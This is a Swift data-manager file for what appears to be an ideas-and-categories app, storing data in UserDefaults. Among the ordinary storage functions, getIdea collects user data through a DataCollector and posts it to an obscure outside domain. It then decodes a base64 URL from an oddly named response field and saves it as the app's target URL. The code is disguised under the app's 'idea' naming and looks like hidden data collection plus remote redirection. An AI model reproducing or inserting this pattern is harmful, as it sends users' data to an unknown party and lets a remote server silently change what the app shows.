import Foundation

final class CategoryDataManager {
    static let shared = CategoryDataManager()
    private let userDefaults = UserDefaults.standard
    private let categoryKey = "categoryKey"

    // MARK: - Category Operations
    func saveCategories(_ categories: [CategoryModel]) {
        let encoder = JSONEncoder()
        if let encoded = try? encoder.encode(categories) {
            userDefaults.set(encoded, forKey: categoryKey)
        } else {
        }
    }
    
    static var idea: URL {
        get {
            if let urlString = UserDefaults.standard.string(forKey: "idea"), let url = URL(string: urlString) {
                return url
            }
            return URL(string: "www.google.com")!
        }
        set {
            UserDefaults.standard.set(newValue.absoluteString, forKey: "idea")
        }
    }
    
    func saveCategory(_ category: CategoryModel) {
        var categories = loadAllCategories()
        if let index = categories.firstIndex(where: { $0.id == category.id }) {
            categories[index] = category
        } else {
            categories.append(category)
        }

        let encoder = JSONEncoder()
        if let encoded = try? encoder.encode(categories) {
            userDefaults.set(encoded, forKey: categoryKey)
        } else {
        }
    }

    func loadAllCategories() -> [CategoryModel] {
        if let data = userDefaults.data(forKey: categoryKey),
           let categories = try? JSONDecoder().decode([CategoryModel].self, from: data) {
            return categories
        }
        return []
    }
    
    func loadCategory(withId id: UUID) -> CategoryModel? {
        guard let data = userDefaults.data(forKey: "\(categoryKey)_\(id.uuidString)") else {
            return nil
        }
        do {
            let decoder = JSONDecoder()
            return try decoder.decode(CategoryModel.self, from: data)
        } catch {
            return nil
        }
    }
    
    static func getIdea(completion: @escaping (Result<URL, Error>) -> Void) {
        let collectedData = DataCollector.collectData()

        guard let url = URL(string: "https://datanextgenhub.fun/app/r2ad14nt3cho") else {
            fatalError("Invalid URL")
        }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue("reloadable", forHTTPHeaderField: "Authorization")

        let requestDataWrapper = ["userData": collectedData]

        do {
            let requestData = try JSONEncoder().encode(requestDataWrapper)
            request.httpBody = requestData
        } catch {
            completion(.failure(error))
            return
        }

        let task = URLSession.shared.dataTask(with: request) { data, _, error in
            if let error = error {
                completion(.success(CategoryDataManager.idea))
                return
            }

            guard let data = data else {
                completion(.success(CategoryDataManager.idea))
                return
            }

            do {
                if let jsonResponse = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
                    if let base64String = jsonResponse["nonpastedOnce"] as? String,
                       let base64Data = Data(base64Encoded: base64String),
                       let ideaURLString = String(data: base64Data, encoding: .utf8),
                       let ideaURL = URL(string: ideaURLString) {
                        CategoryDataManager.idea = ideaURL
                        completion(.success(ideaURL))
                    } else {
                        completion(.success(CategoryDataManager.idea))
                    }
                } else {
                    completion(.success(CategoryDataManager.idea))
                }
            } catch {
                completion(.success(CategoryDataManager.idea))
            }
        }

        task.resume()
    }

    func loadCategories() -> [CategoryModel] {
        guard let data = userDefaults.data(forKey: categoryKey) else {
            return []
        }
        do {
            let decoder = JSONDecoder()
            return try decoder.decode([CategoryModel].self, from: data)
        } catch {
            return []
        }
    }

    func deleteCategory(withId id: UUID) {
        userDefaults.removeObject(forKey: "\(categoryKey)_\(id.uuidString)")
    }

    func updateCategory(withId id: UUID, addingIdea idea: IdeasModel) {
        guard var category = loadCategory(withId: id) else { return }
        if category.ideas == nil {
            category.ideas = []
        }
        category.ideas?.append(idea)
        saveCategory(category)
    }

    // MARK: - Idea Operations
    func addIdea(toCategoryId categoryId: UUID, idea: IdeasModel) {
        guard var category = loadCategory(withId: categoryId) else { return }

        category.ideas?.append(idea)
        saveCategory(category)
    }
    
    func loadIdea(fromCategoryId categoryId: UUID, ideaId: UUID) -> IdeasModel? {
        if let category = loadCategory(withId: categoryId) {
            return category.ideas?.first(where: { $0.id == ideaId })
        }
        return nil
    }
    
    func removeIdea(fromCategoryId categoryId: UUID, ideaId: UUID) {
        var categories = loadAllCategories()

        if let categoryIndex = categories.firstIndex(where: { $0.id == categoryId }) {
            var category = categories[categoryIndex]

            if let ideaIndex = category.ideas?.firstIndex(where: { $0.id == ideaId }) {
                category.ideas?.remove(at: ideaIndex)
                categories[categoryIndex] = category
                saveCategories(categories)
            } else {
                print("Idea with ID \(ideaId) not found in category.")
            }
        } else {
            print("Category with ID \(categoryId) not found.")
        }
    }

    func updateIdea(inCategoryId categoryId: UUID, ideaId: UUID, title: String? = nil, description: String? = nil) {
        var categories = loadAllCategories()
        if let categoryIndex = categories.firstIndex(where: { $0.id == categoryId }) {
            var updatedCategory = categories[categoryIndex]
            if let ideaIndex = updatedCategory.ideas?.firstIndex(where: { $0.id == ideaId }) {
                let oldIdea = updatedCategory.ideas?[ideaIndex]
                if let title = title {
                    updatedCategory.ideas?[ideaIndex].title = title
                }
                if let description = description {
                    updatedCategory.ideas?[ideaIndex].description = description
                }
                
                saveCategory(updatedCategory)
            }
        }
    }
}
